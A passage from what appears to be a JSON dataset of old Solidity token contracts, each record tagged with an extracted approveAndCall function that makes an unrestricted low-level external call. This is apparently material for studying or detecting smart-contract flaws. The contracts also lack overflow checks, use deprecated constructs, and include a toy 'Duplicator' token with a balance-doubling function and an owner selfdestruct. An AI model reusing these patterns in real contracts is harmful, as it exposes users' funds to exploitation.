  ]
},
{
  "_id": {
    "$oid": "663b8db6fcb296bdecdb157d"
  },
  "filename": "34662.sol",
  "content": "pragma solidity ^0.4.4;\ncontract Token {\n function totalSupply() constant returns (uint256 supply) {}\n function balanceOf(address _owner) constant returns (uint256 balance) {}\n function transfer(address _to, uint256 _value) returns (bool success) {}\n function transferFrom(address _from, address _to, uint256 _value) returns (bool success) {}\n function approve(address _spender, uint256 _value) returns (bool success) {}\n function allowance(address _owner, address _spender) constant returns (uint256 remaining) {}\n event Transfer(address indexed _from, address indexed _to, uint256 _value);\n event Approval(address indexed _owner, address indexed _spender, uint256 _value);\n}\ncontract StandardToken is Token {\n function transfer(address _to, uint256 _value) returns (bool success) {\n if (balances[msg.sender] >= _value && _value > 0) {\n balances[msg.sender] -= _value;\n balances[_to] += _value;\n Transfer(msg.sender, _to, _value);\n return true;\n } else { return false; }\n }\n function transferFrom(address _from, address _to, uint256 _value) returns (bool success) {\n if (balances[_from] >= _value && allowed[_from][msg.sender] >= _value && _value > 0) {\n balances[_to] += _value;\n balances[_from] -= _value;\n allowed[_from][msg.sender] -= _value;\n Transfer(_from, _to, _value);\n return true;\n } else { return false; }\n }\n function balanceOf(address _owner) constant returns (uint256 balance) {\n return balances[_owner];\n }\n function approve(address _spender, uint256 _value) returns (bool success) {\n allowed[msg.sender][_spender] = _value;\n Approval(msg.sender, _spender, _value);\n return true;\n }\n function allowance(address _owner, address _spender) constant returns (uint256 remaining) {\n return allowed[_owner][_spender];\n }\n mapping (address => uint256) balances;\n mapping (address => mapping (address => uint256)) allowed;\n uint256 public totalSupply;\n}\ncontract JUSTcoin is StandardToken {\n function () {\n throw;\n }\n string public name;\n uint8 public decimals;\n string public symbol;\n string public version = 'H1.0';\n function JUSTcoin(\n ) {\n balances[msg.sender] = 21000000;\n totalSupply = 21000000;\n name = \"JUST coin\";\n decimals = 0;\n symbol = \"JUST\";\n }\n function approveAndCall(address _spender, uint256 _value, bytes _extraData) returns (bool success) {\n allowed[msg.sender][_spender] = _value;\n Approval(msg.sender, _spender, _value);\n if(!_spender.call(bytes4(bytes32(sha3(\"receiveApproval(address,uint256,address,bytes)\"))), msg.sender, _value, this, _extraData)) { throw; }\n return true;\n }\n}",
  "extract_feature": [
    "function approveAndCall(address _spender, uint256 _value, bytes _extraData) returns (bool success) {\nallowed[msg.sender][_spender] = _value;\nApproval(msg.sender, _spender, _value);\nif(!_spender.call(bytes4(bytes32(sha3(\"receiveApproval(address,uint256,address,bytes)\"))), msg.sender, _value, this, _extraData)) { throw; }\nreturn true;\n}"
  ]
},
{
  "_id": {
    "$oid": "663b8db6fcb296bdecdb157e"
  },
  "filename": "34689.sol",
  "content": "pragma solidity ^0.4.4;\ncontract Token {\n function totalSupply() constant returns (uint256 supply) {}\n function balanceOf(address _owner) constant returns (uint256 balance) {}\n function transfer(address _to, uint256 _value) returns (bool success) {}\n function transferFrom(address _from, address _to, uint256 _value) returns (bool success) {}\n function approve(address _spender, uint256 _value) returns (bool success) {}\n function allowance(address _owner, address _spender) constant returns (uint256 remaining) {}\n event Transfer(address indexed _from, address indexed _to, uint256 _value);\n event Approval(address indexed _owner, address indexed _spender, uint256 _value);\n}\ncontract StandardToken is Token {\n function transfer(address _to, uint256 _value) returns (bool success) {\n if (balances[msg.sender] >= _value && _value > 0) {\n balances[msg.sender] -= _value;\n balances[_to] += _value;\n Transfer(msg.sender, _to, _value);\n return true;\n } else { return false; }\n }\n function transferFrom(address _from, address _to, uint256 _value) returns (bool success) {\n if (balances[_from] >= _value && allowed[_from][msg.sender] >= _value && _value > 0) {\n balances[_to] += _value;\n balances[_from] -= _value;\n allowed[_from][msg.sender] -= _value;\n Transfer(_from, _to, _value);\n return true;\n } else { return false; }\n }\n function balanceOf(address _owner) constant returns (uint256 balance) {\n return balances[_owner];\n }\n function approve(address _spender, uint256 _value) returns (bool success) {\n allowed[msg.sender][_spender] = _value;\n Approval(msg.sender, _spender, _value);\n return true;\n }\n function allowance(address _owner, address _spender) constant returns (uint256 remaining) {\n return allowed[_owner][_spender];\n }\n mapping (address => uint256) balances;\n mapping (address => mapping (address => uint256)) allowed;\n uint256 public totalSupply;\n}\ncontract BitPig is StandardToken {\n function () {\n throw;\n }\n string public name;\n uint8 public decimals;\n string public symbol;\n string public version = '1';\n function BitPig(\n ) {\n balances[msg.sender] = 2000000000;\n totalSupply = 2000000000;\n name = \"BITPIG\";\n decimals = 2;\n symbol = \"BPG\";\n }\n function approveAndCall(address _spender, uint256 _value, bytes _extraData) returns (bool success) {\n allowed[msg.sender][_spender] = _value;\n Approval(msg.sender, _spender, _value);\n if(!_spender.call(bytes4(bytes32(sha3(\"receiveApproval(address,uint256,address,bytes)\"))), msg.sender, _value, this, _extraData)) { throw; }\n return true;\n }\n}",
  "extract_feature": [
    "function approveAndCall(address _spender, uint256 _value, bytes _extraData) returns (bool success) {\nallowed[msg.sender][_spender] = _value;\nApproval(msg.sender, _spender, _value);\nif(!_spender.call(bytes4(bytes32(sha3(\"receiveApproval(address,uint256,address,bytes)\"))), msg.sender, _value, this, _extraData)) { throw; }\nreturn true;\n}"
  ]
},
{
  "_id": {
    "$oid": "663b8db6fcb296bdecdb157f"
  },
  "filename": "34713.sol",
  "content": "pragma solidity ^0.4.4;\ncontract Token {\n function totalSupply() constant returns (uint256 supply) {}\n function balanceOf(address _owner) constant returns (uint256 balance) {}\n function transfer(address _to, uint256 _value) returns (bool success) {}\n function transferFrom(address _from, address _to, uint256 _value) returns (bool success) {}\n function approve(address _spender, uint256 _value) returns (bool success) {}\n function allowance(address _owner, address _spender) constant returns (uint256 remaining) {}\n event Transfer(address indexed _from, address indexed _to, uint256 _value);\n event Approval(address indexed _owner, address indexed _spender, uint256 _value);\n}\ncontract StandardToken is Token {\n function transfer(address _to, uint256 _value) returns (bool success) {\n if (balances[msg.sender] >= _value && _value > 0) {\n balances[msg.sender] -= _value;\n balances[_to] += _value;\n Transfer(msg.sender, _to, _value);\n return true;\n } else { return false; }\n }\n function transferFrom(address _from, address _to, uint256 _value) returns (bool success) {\n if (balances[_from] >= _value && allowed[_from][msg.sender] >= _value && _value > 0) {\n balances[_to] += _value;\n balances[_from] -= _value;\n allowed[_from][msg.sender] -= _value;\n Transfer(_from, _to, _value);\n return true;\n } else { return false; }\n }\n function balanceOf(address _owner) constant returns (uint256 balance) {\n return balances[_owner];\n }\n function approve(address _spender, uint256 _value) returns (bool success) {\n allowed[msg.sender][_spender] = _value;\n Approval(msg.sender, _spender, _value);\n return true;\n }\n function allowance(address _owner, address _spender) constant returns (uint256 remaining) {\n return allowed[_owner][_spender];\n }\n mapping (address => uint256) balances;\n mapping (address => mapping (address => uint256)) allowed;\n uint256 public totalSupply;\n}\ncontract PPYCOIN is StandardToken {\n function () {\n throw;\n }\n string public name;\n uint8 public decimals;\n string public symbol;\n string public version = 'H1.0';\n function PPYCOIN(\n ) {\n balances[msg.sender] = 1000000;\n totalSupply = 1000000;\n name = \"PPYForever\";\n decimals = 0;\n symbol = \"PPY\";\n }\n function approveAndCall(address _spender, uint256 _value, bytes _extraData) returns (bool success) {\n allowed[msg.sender][_spender] = _value;\n Approval(msg.sender, _spender, _value);\n if(!_spender.call(bytes4(bytes32(sha3(\"receiveApproval(address,uint256,address,bytes)\"))), msg.sender, _value, this, _extraData)) { throw; }\n return true;\n }\n}",
  "extract_feature": [
    "function approveAndCall(address _spender, uint256 _value, bytes _extraData) returns (bool success) {\nallowed[msg.sender][_spender] = _value;\nApproval(msg.sender, _spender, _value);\nif(!_spender.call(bytes4(bytes32(sha3(\"receiveApproval(address,uint256,address,bytes)\"))), msg.sender, _value, this, _extraData)) { throw; }\nreturn true;\n}"
  ]
},
{
  "_id": {
    "$oid": "663b8db6fcb296bdecdb1580"
  },
  "filename": "34716.sol",
  "content": "pragma solidity ^0.4.4;\ncontract Token {\n function totalSupply() constant returns (uint256 supply) {}\n function balanceOf(address _owner) constant returns (uint256 balance) {}\n function transfer(address _to, uint256 _value) returns (bool success) {}\n function transferFrom(address _from, address _to, uint256 _value) returns (bool success) {}\n function approve(address _spender, uint256 _value) returns (bool success) {}\n function allowance(address _owner, address _spender) constant returns (uint256 remaining) {}\n event Transfer(address indexed _from, address indexed _to, uint256 _value);\n event Approval(address indexed _owner, address indexed _spender, uint256 _value);\n}\ncontract StandardToken is Token {\n function transfer(address _to, uint256 _value) returns (bool success) {\n if (balances[msg.sender] >= _value && _value > 0) {\n balances[msg.sender] -= _value;\n balances[_to] += _value;\n Transfer(msg.sender, _to, _value);\n return true;\n } else { return false; }\n }\n function transferFrom(address _from, address _to, uint256 _value) returns (bool success) {\n if (balances[_from] >= _value && allowed[_from][msg.sender] >= _value && _value > 0) {\n balances[_to] += _value;\n balances[_from] -= _value;\n allowed[_from][msg.sender] -= _value;\n Transfer(_from, _to, _value);\n return true;\n } else { return false; }\n }\n function balanceOf(address _owner) constant returns (uint256 balance) {\n return balances[_owner];\n }\n function approve(address _spender, uint256 _value) returns (bool success) {\n allowed[msg.sender][_spender] = _value;\n Approval(msg.sender, _spender, _value);\n return true;\n }\n function allowance(address _owner, address _spender) constant returns (uint256 remaining) {\n return allowed[_owner][_spender];\n }\n mapping (address => uint256) balances;\n mapping (address => mapping (address => uint256)) allowed;\n uint256 public totalSupply;\n}\ncontract PhoenixCoin is StandardToken {\n function () {\n throw;\n }\n string public name;\n uint8 public decimals;\n string public symbol;\n string public version = 'H1.0';\n function PhoenixCoin(\n ) {\n balances[msg.sender] = 10000000000000000;\n totalSupply = 10000000000000000;\n name = \"PhoenixCoin\";\n decimals = 8;\n symbol = \"PHXe\";\n }\n function approveAndCall(address _spender, uint256 _value, bytes _extraData) returns (bool success) {\n allowed[msg.sender][_spender] = _value;\n Approval(msg.sender, _spender, _value);\n if(!_spender.call(bytes4(bytes32(sha3(\"receiveApproval(address,uint256,address,bytes)\"))), msg.sender, _value, this, _extraData)) { throw; }\n return true;\n }\n}",
  "extract_feature": [
    "function approveAndCall(address _spender, uint256 _value, bytes _extraData) returns (bool success) {\nallowed[msg.sender][_spender] = _value;\nApproval(msg.sender, _spender, _value);\nif(!_spender.call(bytes4(bytes32(sha3(\"receiveApproval(address,uint256,address,bytes)\"))), msg.sender, _value, this, _extraData)) { throw; }\nreturn true;\n}"
  ]
},
{
  "_id": {
    "$oid": "663b8db6fcb296bdecdb1581"
  },
  "filename": "34718.sol",
  "content": "pragma solidity ^0.4.4;\ncontract Token {\n function totalSupply() constant returns (uint256 supply) {}\n function balanceOf(address _owner) constant returns (uint256 balance) {}\n function transfer(address _to, uint256 _value) returns (bool success) {}\n function transferFrom(address _from, address _to, uint256 _value) returns (bool success) {}\n function approve(address _spender, uint256 _value) returns (bool success) {}\n function allowance(address _owner, address _spender) constant returns (uint256 remaining) {}\n event Transfer(address indexed _from, address indexed _to, uint256 _value);\n event Approval(address indexed _owner, address indexed _spender, uint256 _value);\n}\ncontract StandardToken is Token {\n function transfer(address _to, uint256 _value) returns (bool success) {\n if (balances[msg.sender] >= _value && _value > 0) {\n balances[msg.sender] -= _value;\n balances[_to] += _value;\n Transfer(msg.sender, _to, _value);\n return true;\n } else { return false; }\n }\n function transferFrom(address _from, address _to, uint256 _value) returns (bool success) {\n if (balances[_from] >= _value && allowed[_from][msg.sender] >= _value && _value > 0) {\n balances[_to] += _value;\n balances[_from] -= _value;\n allowed[_from][msg.sender] -= _value;\n Transfer(_from, _to, _value);\n return true;\n } else { return false; }\n }\n function balanceOf(address _owner) constant returns (uint256 balance) {\n return balances[_owner];\n }\n function approve(address _spender, uint256 _value) returns (bool success) {\n allowed[msg.sender][_spender] = _value;\n Approval(msg.sender, _spender, _value);\n return true;\n }\n function allowance(address _owner, address _spender) constant returns (uint256 remaining) {\n return allowed[_owner][_spender];\n }\n mapping (address => uint256) balances;\n mapping (address => mapping (address => uint256)) allowed;\n uint256 public totalSupply;\n}\ncontract test2 is StandardToken {\n function () {\n throw;\n }\n string public name;\n uint8 public decimals;\n string public symbol;\n string public version = 'H1.0';\n function test2(\n ) {\n balances[msg.sender] = 10000;\n totalSupply = 10000;\n name = \"test2\";\n decimals = 2;\n symbol = \"tt2\";\n }\n function approveAndCall(address _spender, uint256 _value, bytes _extraData) returns (bool success) {\n allowed[msg.sender][_spender] = _value;\n Approval(msg.sender, _spender, _value);\n if(!_spender.call(bytes4(bytes32(sha3(\"receiveApproval(address,uint256,address,bytes)\"))), msg.sender, _value, this, _extraData)) { throw; }\n return true;\n }\n}",
  "extract_feature": [
    "function approveAndCall(address _spender, uint256 _value, bytes _extraData) returns (bool success) {\nallowed[msg.sender][_spender] = _value;\nApproval(msg.sender, _spender, _value);\nif(!_spender.call(bytes4(bytes32(sha3(\"receiveApproval(address,uint256,address,bytes)\"))), msg.sender, _value, this, _extraData)) { throw; }\nreturn true;\n}"
  ]
},
{
  "_id": {
    "$oid": "663b8db6fcb296bdecdb1582"
  },
  "filename": "34749.sol",
  "content": "pragma solidity ^0.4.4;\ncontract Token {\n function totalSupply() constant returns (uint256 supply) {}\n function balanceOf(address _owner) constant returns (uint256 balance) {}\n function transfer(address _to, uint256 _value) returns (bool success) {}\n function transferFrom(address _from, address _to, uint256 _value) returns (bool success) {}\n function approve(address _spender, uint256 _value) returns (bool success) {}\n function allowance(address _owner, address _spender) constant returns (uint256 remaining) {}\n event Transfer(address indexed _from, address indexed _to, uint256 _value);\n event Approval(address indexed _owner, address indexed _spender, uint256 _value);\n}\ncontract StandardToken is Token {\n function transfer(address _to, uint256 _value) returns (bool success) {\n if (balances[msg.sender] >= _value && _value > 0) {\n balances[msg.sender] -= _value;\n balances[_to] += _value;\n Transfer(msg.sender, _to, _value);\n return true;\n } else { return false; }\n }\n function transferFrom(address _from, address _to, uint256 _value) returns (bool success) {\n if (balances[_from] >= _value && allowed[_from][msg.sender] >= _value && _value > 0) {\n balances[_to] += _value;\n balances[_from] -= _value;\n allowed[_from][msg.sender] -= _value;\n Transfer(_from, _to, _value);\n return true;\n } else { return false; }\n }\n function balanceOf(address _owner) constant returns (uint256 balance) {\n return balances[_owner];\n }\n function approve(address _spender, uint256 _value) returns (bool success) {\n allowed[msg.sender][_spender] = _value;\n Approval(msg.sender, _spender, _value);\n return true;\n }\n function allowance(address _owner, address _spender) constant returns (uint256 remaining) {\n return allowed[_owner][_spender];\n }\n mapping (address => uint256) balances;\n mapping (address => mapping (address => uint256)) allowed;\n uint256 public totalSupply;\n}\ncontract LebaneseCoin is StandardToken {\n function () {\n throw;\n }\n string public name;\n uint8 public decimals;\n string public symbol;\n string public version = 'H1.0';\n function LebaneseCoin(\n ) {\n balances[msg.sender] = 10452000;\n totalSupply = 10452000;\n name = \"LebaneseCoin\";\n decimals = 0;\n symbol = \"LBC\";\n }\n function approveAndCall(address _spender, uint256 _value, bytes _extraData) returns (bool success) {\n allowed[msg.sender][_spender] = _value;\n Approval(msg.sender, _spender, _value);\n if(!_spender.call(bytes4(bytes32(sha3(\"receiveApproval(address,uint256,address,bytes)\"))), msg.sender, _value, this, _extraData)) { throw; }\n return true;\n }\n}",
  "extract_feature": [
    "function approveAndCall(address _spender, uint256 _value, bytes _extraData) returns (bool success) {\nallowed[msg.sender][_spender] = _value;\nApproval(msg.sender, _spender, _value);\nif(!_spender.call(bytes4(bytes32(sha3(\"receiveApproval(address,uint256,address,bytes)\"))), msg.sender, _value, this, _extraData)) { throw; }\nreturn true;\n}"
  ]
},
{
  "_id": {
    "$oid": "663b8db6fcb296bdecdb1583"
  },
  "filename": "34751.sol",
  "content": "pragma solidity 0.4.18;\ncontract Token {\n uint256 public totalSupply;\n function balanceOf(address _owner) constant returns (uint256 balance);\n function transfer(address _to, uint256 _value) returns (bool success);\n function transferFrom(address _from, address _to, uint256 _value) returns (bool success);\n function approve(address _spender, uint256 _value) returns (bool success);\n function allowance(address _owner, address _spender) constant returns (uint256 remaining);\n event Transfer(address indexed _from, address indexed _to, uint256 _value);\n event Approval(address indexed _owner, address indexed _spender, uint256 _value);\n}\ncontract StandardToken is Token {\n uint256 constant MAX_UINT256 = 2**256 - 1;\n function transfer(address _to, uint256 _value) returns (bool success) {\n require(balances[msg.sender] >= _value);\n balances[msg.sender] -= _value;\n balances[_to] += _value;\n Transfer(msg.sender, _to, _value);\n return true;\n }\n function transferFrom(address _from, address _to, uint256 _value) returns (bool success) {\n uint256 allowance = allowed[_from][msg.sender];\n require(balances[_from] >= _value && allowance >= _value);\n balances[_to] += _value;\n balances[_from] -= _value;\n if (allowance < MAX_UINT256) {\n allowed[_from][msg.sender] -= _value;\n }\n Transfer(_from, _to, _value);\n return true;\n }\n function balanceOf(address _owner) constant returns (uint256 balance) {\n return balances[_owner];\n }\n function approve(address _spender, uint256 _value) returns (bool success) {\n allowed[msg.sender][_spender] = _value;\n Approval(msg.sender, _spender, _value);\n return true;\n }\n function allowance(address _owner, address _spender) constant returns (uint256 remaining) {\n return allowed[_owner][_spender];\n }\n mapping (address => uint256) balances;\n mapping (address => mapping (address => uint256)) allowed;\n}\ncontract HumanStandardToken is StandardToken {\n string public name;\n uint8 public decimals;\n string public symbol;\n function HumanStandardToken(\n uint256 _initialAmount,\n string _tokenName,\n uint8 _decimalUnits,\n string _tokenSymbol\n ) {\n balances[msg.sender] = _initialAmount;\n totalSupply = _initialAmount;\n name = _tokenName;\n decimals = _decimalUnits;\n symbol = _tokenSymbol;\n }\n function approveAndCall(address _spender, uint256 _value, bytes _extraData) returns (bool success) {\n allowed[msg.sender][_spender] = _value;\n Approval(msg.sender, _spender, _value);\n require(_spender.call(bytes4(bytes32(keccak256(\"receiveApproval(address,uint256,address,bytes)\"))), msg.sender, _value, this, _extraData));\n return true;\n }\n}\ncontract Owned {\n address public owner;\n function Owned() {\n owner = msg.sender;\n }\n modifier onlyOwner {\n require(msg.sender == owner);\n _;\n }\n function transferOwnership(address newOwner) onlyOwner {\n owner = newOwner;\n }\n}\ncontract Duplicator is Owned, HumanStandardToken {\n function Duplicator() HumanStandardToken(0, \"Duplicator\", 0, \"DUP\") {}\n function () public payable {\n buy();\n }\n function buy() public payable {\n totalSupply += msg.value;\n balances[msg.sender] += msg.value;\n }\n function duplicate() public {\n totalSupply += balances[msg.sender];\n balances[msg.sender] += balances[msg.sender];\n }\n function sellAll() public {\n uint amountToSell = balances[msg.sender];\n totalSupply -= amountToSell;\n balances[msg.sender] -= amountToSell;\n msg.sender.transfer(amountToSell);\n require(this.balance == totalSupply);\n }\n function migrate(address newContract) public onlyOwner {\n selfdestruct(newContract);\n }\n}",
  "extract_feature": [
    "function approveAndCall(address _spender, uint256 _value, bytes _extraData) returns (bool success) {\nallowed[msg.sender][_spender] = _value;\nApproval(msg.sender, _spender, _value);\nrequire(_spender.call(bytes4(bytes32(keccak256(\"receiveApproval(address,uint256,address,bytes)\"))), msg.sender, _value, this, _extraData));\nreturn true;\n}"
  ]
},
{
  "_id": {
    "$oid": "663b8db6fcb296bdecdb1584"
  },
  "filename": "34764.sol",
  "content": "pragma solidity ^0.4.4;\ncontract Token {\n function totalSupply() constant returns (uint256 supply) {}\n function balanceOf(address _owner) constant returns (uint256 balance) {}\n function transfer(address _to, uint256 _value) returns (bool success) {}\n function transferFrom(address _from, address _to, uint256 _value) returns (bool success) {}\n function approve(address _spender, uint256 _value) returns (bool success) {}\n function allowance(address _owner, address _spender) constant returns (uint256 remaining) {}\n event Transfer(address indexed _from, address indexed _to, uint256 _value);\n event Approval(address indexed _owner, address indexed _spender, uint256 _value);\n}\ncontract StandardToken is Token {\n function transfer(address _to, uint256 _value) returns (bool success) {\n if (balances[msg.sender] >= _value && _value > 0) {\n balances[msg.sender] -= _value;\n balances[_to] += _value;\n Transfer(msg.sender, _to, _value);\n return true;\n } else { return false; }\n }\n function transferFrom(address _from, address _to, uint256 _value) returns (bool success) {\n if (balances[_from] >= _value && allowed[_from][msg.sender] >= _value && _value > 0) {\n balances[_to] += _value;\n balances[_from] -= _value;\n allowed[_from][msg.sender] -= _value;\n Transfer(_from, _to, _value);\n return true;\n } else { return false; }\n }\n function balanceOf(address _owner) constant returns (uint256 balance) {\n return balances[_owner];\n }\n function approve(address _spender, uint256 _value) returns (bool success) {\n allowed[msg.sender][_spender] = _value;\n Approval(msg.sender, _spender, _value);\n return true;\n }\n function allowance(address _owner, address _spender) constant returns (uint256 remaining) {\n return allowed[_owner][_spender];\n }\n mapping (address => uint256) balances;\n mapping (address => mapping (address => uint256)) allowed;\n uint256 public totalSupply;\n}\ncontract CTeloTest is StandardToken {\n function () {\n throw;\n }\n string public name;\n uint8 public decimals;\n string public symbol;\n string public version = 'H1.0';\n function CTeloTest(\n ) {\n balances[msg.sender] = 85000000000000000;\n totalSupply = 85000000000000000;\n name = \"CTeloTest\";\n decimals = 8;\n symbol = \"CTT\";\n }\n function approveAndCall(address _spender, uint256 _value, bytes _extraData) returns (bool success) {\n allowed[msg.sender][_spender] = _value;\n Approval(msg.sender, _spender, _value);\n if(!_spender.call(bytes4(bytes32(sha3(\"receiveApproval(address,uint256,address,bytes)\"))), msg.sender, _value, this, _extraData)) { throw; }\n return true;\n }\n}",
  "extract_feature": [
    "function approveAndCall(address _spender, uint256 _value, bytes _extraData) returns (bool success) {\nallowed[msg.sender][_spender] = _value;\nApproval(msg.sender, _spender, _value);\nif(!_spender.call(bytes4(bytes32(sha3(\"receiveApproval(address,uint256,address,bytes)\"))), msg.sender, _value, this, _extraData)) { throw; }\nreturn true;\n}"
  ]
},
{
  "_id": {
    "$oid": "663b8db6fcb296bdecdb1585"
  },
  "filename": "34792.sol",
  "content": "pragma solidity ^0.4.4;\ncontract Token {\n function totalSupply() constant returns (uint256 supply) {}\n function balanceOf(address _owner) constant returns (uint256 balance) {}\n function transfer(address _to, uint256 _value) returns (bool success) {}\n function transferFrom(address _from, address _to, uint256 _value) returns (bool success) {}\n function approve(address _spender, uint256 _value) returns (bool success) {}\n function allowance(address _owner, address _spender) constant returns (uint256 remaining) {}\n event Transfer(address indexed _from, address indexed _to, uint256 _value);\n event Approval(address indexed _owner, address indexed _spender, uint256 _value);\n}\ncontract StandardToken is Token {\n function transfer(address _to, uint256 _value) returns (bool success) {\n if (balances[msg.sender] >= _value && _value > 0) {\n balances[msg.sender] -= _value;\n balances[_to] += _value;\n Transfer(msg.sender, _to, _value);\n return true;\n } else { return false; }\n }\n function transferFrom(address _from, address _to, uint256 _value) returns (bool success) {\n if (balances[_from] >= _value && allowed[_from][msg.sender] >= _value && _value > 0) {\n balances[_to] += _value;\n balances[_from] -= _value;\n allowed[_from][msg.sender] -= _value;\n Transfer(_from, _to, _value);\n return true;\n } else { return false; }\n }\n function balanceOf(address _owner) constant returns (uint256 balance) {\n return balances[_owner];\n }\n function approve(address _spender, uint256 _value) returns (bool success) {\n allowed[msg.sender][_spender] = _value;\n Approval(msg.sender, _spender, _value);\n return true;\n }\n function allowance(address _owner, address _spender) constant returns (uint256 remaining) {\n return allowed[_owner][_spender];\n }\n mapping (address => uint256) balances;\n mapping (address => mapping (address => uint256)) allowed;\n uint256 public totalSupply;\n}\ncontract EGAMEToken is StandardToken {\n function () {\n revert();\n }\n string public name;\n uint8 public decimals;\n string public symbol;\n string public version = 'H1.0';\n function EGAMEToken(\n ) {\n balances[msg.sender] = 120000000000000000;\n totalSupply = 120000000000000000;\n name = \"EGAME Token\";\n decimals = 8;\n symbol = \"EGAMET\";\n }\n function approveAndCall(address _spender, uint256 _value, bytes _extraData) returns (bool success) {\n allowed[msg.sender][_spender] = _value;\n Approval(msg.sender, _spender, _value);\n if(!_spender.call(bytes4(bytes32(sha3(\"receiveApproval(address,uint256,address,bytes)\"))), msg.sender, _value, this, _extraData)) { revert(); }\n return true;\n }\n}",
  "extract_feature": [
    "function approveAndCall(address _spender, uint256 _value, bytes _extraData) returns (bool success) {\nallowed[msg.sender][_spender] = _value;\nApproval(msg.sender, _spender, _value);\nif(!_spender.call(bytes4(bytes32(sha3(\"receiveApproval(address,uint256,address,bytes)\"))), msg.sender, _value, this, _extraData)) { revert(); }\nreturn true;\n}"
  ]
},
{
  "_id": {
    "$oid": "663b8db6fcb296bdecdb1586"
  },
  "filename": "34793.sol",
  "content": "pragma solidity ^0.4.4;\ncontract Token {\n function totalSupply() constant returns (uint256 supply) {}\n function balanceOf(address _owner) constant returns (uint256 balance) {}\n function transfer(address _to, uint256 _value) returns (bool success) {}\n function transferFrom(address _from, address _to, uint256 _value) returns (bool success) {}\n function approve(address _spender, uint256 _value) returns (bool success) {}\n function allowance(address _owner, address _spender) constant returns (uint256 remaining) {}\n event Transfer(address indexed _from, address indexed _to, uint256 _value);\n event Approval(address indexed _owner, address indexed _spender, uint256 _value);\n}\ncontract StandardToken is Token {\n function transfer(address _to, uint256 _value) returns (bool success) {\n if (balances[msg.sender] >= _value && _value > 0) {\n balances[msg.sender] -= _value;\n balances[_to] += _value;\n Transfer(msg.sender, _to, _value);\n return true;\n } else { return false; }\n }\n function transferFrom(address _from, address _to, uint256 _value) returns (bool success) {\n if (balances[_from] >= _value && allowed[_from][msg.sender] >= _value && _value > 0) {\n balances[_to] += _value;\n balances[_from] -= _value;\n allowed[_from][msg.sender] -= _value;\n Transfer(_from, _to, _value);\n return true;\n } else { return false; }\n }\n function balanceOf(address _owner) constant returns (uint256 balance) {\n return balances[_owner];\n }\n function approve(address _spender, uint256 _value) returns (bool success) {\n allowed[msg.sender][_spender] = _value;\n Approval(msg.sender, _spender, _value);\n return true;\n }\n function allowance(address _owner, address _spender) constant returns (uint256 remaining) {\n return allowed[_owner][_spender];\n }\n mapping (address => uint256) balances;\n mapping (address => mapping (address => uint256)) allowed;\n uint256 public totalSupply;\n}\ncontract EGAMEToken is StandardToken {\n function () {\n revert();\n }\n string public name;\n uint8 public decimals;\n string public symbol;\n string public version = 'H1.0';\n function EGAMEToken(\n ) {\n balances[msg.sender] = 1200000000000000;\n totalSupply = 1200000000000000;\n name = \"EGAME Token\";\n decimals = 8;\n symbol = \"EGAMET\";\n }\n function approveAndCall(address _spender, uint256 _value, bytes _extraData) returns (bool success) {\n allowed[msg.sender][_spender] = _value;\n Approval(msg.sender, _spender, _value);\n if(!_spender.call(bytes4(bytes32(sha3(\"receiveApproval(address,uint256,address,bytes)\"))), msg.sender, _value, this, _extraData)) { revert(); }\n return true;\n }\n}",
  "extract_feature": [
    "function approveAndCall(address _spender, uint256 _value, bytes _extraData) returns (bool success) {\nallowed[msg.sender][_spender] = _value;\nApproval(msg.sender, _spender, _value);\nif(!_spender.call(bytes4(bytes32(sha3(\"receiveApproval(address,uint256,address,bytes)\"))), msg.sender, _value, this, _extraData)) { revert(); }\nreturn true;\n}"
  ]
},
{
  "_id": {
    "$oid": "663b8db6fcb296bdecdb1587"
  },
  "filename": "34799.sol",
  "content": "pragma solidity ^0.4.4;\ncontract Token {\n function totalSupply() constant returns (uint256 supply) {}\n function balanceOf(address _owner) constant returns (uint256 balance) {}\n function transfer(address _to, uint256 _value) returns (bool success) {}\n function transferFrom(address _from, address _to, uint256 _value) returns (bool success) {}\n function approve(address _spender, uint256 _value) returns (bool success) {}\n function allowance(address _owner, address _spender) constant returns (uint256 remaining) {}\n event Transfer(address indexed _from, address indexed _to, uint256 _value);\n event Approval(address indexed _owner, address indexed _spender, uint256 _value);\n}\ncontract StandardToken is Token {\n function transfer(address _to, uint256 _value) returns (bool success) {\n if (balances[msg.sender] >= _value && _value > 0) {\n balances[msg.sender] -= _value;\n balances[_to] += _value;\n Transfer(msg.sender, _to, _value);\n return true;\n } else { return false; }\n }\n function transferFrom(address _from, address _to, uint256 _value) returns (bool success) {\n if (balances[_from] >= _value && allowed[_from][msg.sender] >= _value && _value > 0) {\n balances[_to] += _value;\n balances[_from] -= _value;\n allowed[_from][msg.sender] -= _value;\n Transfer(_from, _to, _value);\n return true;\n } else { return false; }\n }\n function balanceOf(address _owner) constant returns (uint256 balance) {\n return balances[_owner];\n }\n function approve(address _spender, uint256 _value) returns (bool success) {\n allowed[msg.sender][_spender] = _value;\n Approval(msg.sender, _spender, _value);\n return true;\n }\n function allowance(address _owner, address _spender) constant returns (uint256 remaining) {\n return allowed[_owner][_spender];\n }\n mapping (address => uint256) balances;\n mapping (address => mapping (address => uint256)) allowed;\n uint256 public totalSupply;\n}\ncontract ERC20Token is StandardToken {\n function () {\n throw;\n }\n string public name;\n uint8 public decimals;\n string public symbol;\n string public version = 'H1.0';\n function ERC20Token(\n ) {\n balances[msg.sender] = 500000000000000;\n totalSupply = 500000000000000;\n name = \"Zcash Gold\";\n decimals = 8;\n symbol = \"ZCG\";\n }\n function approveAndCall(address _spender, uint256 _value, bytes _extraData) returns (bool success) {\n allowed[msg.sender][_spender] = _value;\n Approval(msg.sender, _spender, _value);\n if(!_spender.call(bytes4(bytes32(sha3(\"receiveApproval(address,uint256,address,bytes)\"))), msg.sender, _value, this, _extraData)) { throw; }\n return true;\n }\n}",
  "extract_feature": [
    "function approveAndCall(address _spender, uint256 _value, bytes _extraData) returns (bool success) {\nallowed[msg.sender][_spender] = _value;\nApproval(msg.sender, _spender, _value);\nif(!_spender.call(bytes4(bytes32(sha3(\"receiveApproval(address,uint256,address,bytes)\"))), msg.sender, _value, this, _extraData)) { throw; }\nreturn true;\n}"
  ]
},
{
  "_id": {
    "$oid": "663b8db6fcb296bdecdb1588"
  },
  "filename": "348.sol",
